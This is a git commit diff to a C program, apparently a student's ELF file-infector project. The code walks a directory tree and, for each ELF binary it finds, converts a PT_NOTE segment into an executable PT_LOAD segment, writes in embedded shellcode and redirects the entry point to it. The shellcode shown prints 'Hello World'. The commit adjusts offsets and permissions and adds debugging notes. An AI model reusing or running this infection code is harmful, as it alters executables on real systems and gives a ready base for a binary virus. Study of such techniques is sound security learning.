1df075cdb6e60d546783d71b5c305f8a5ebe3a1d
Sean <sean@ghostblood.student.rit.edu>
2023-11-15 22:09:01 -0500

    planned some ideas for debugging

--- main.c
+++ main.c
@@ -7,7 +7,7 @@
 #include <ftw.h>
 
 unsigned char shellcode[] = \
-"\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a\xE9\x00\x00\x00\x00";
+"\xeb\x17\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x59\x31\xd2\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a\xE9\x9A\x1E\x06\x00";
 
 int checkifElf(Elf64_Ehdr elfHeader){
     unsigned char *fileMagicNumbers = elfHeader.e_ident;
@@ -52,7 +52,7 @@ int walkDirectory(const char *filename, const struct stat *statptr, int fileflag
         //note really study whats going on in here
         elfSegment.p_type = 1;
         printf("\tPT_NOTE segment Updated to PT_LOAD segment\n");
-        elfSegment.p_flags = PF_R | PF_X;
+        elfSegment.p_flags = PF_R | PF_W | PF_X;
         printf("\tMade PT_LOAD segment executable\n");
         elfSegment.p_filesz += strlen(shellcode);
         printf("\tUpdated filesize for code cave\n");
@@ -64,9 +64,16 @@ int walkDirectory(const char *filename, const struct stat *statptr, int fileflag
 
         fwrite(&elfSegment, sizeof(elfSegment), 1, filePointer);
         
-        fseek(filePointer, 0xc000000, SEEK_SET);
+        fseek(filePointer, elfSegment.p_vaddr, SEEK_SET);
         fwrite(shellcode, sizeof(shellcode), 1, filePointer);
 
+        /*
+        TODO ideas
+        1. Read and figure out how an executable runs and is loaded
+        2. study what the above code is doing by modifiying those particular headers
+        3. Double check the shellcode
+        4. understand the gdb stack trace and whats going on there
+        */
 
         elfHeader.e_entry = 0xc000000;
         fseek(filePointer, 0, SEEK_SET);
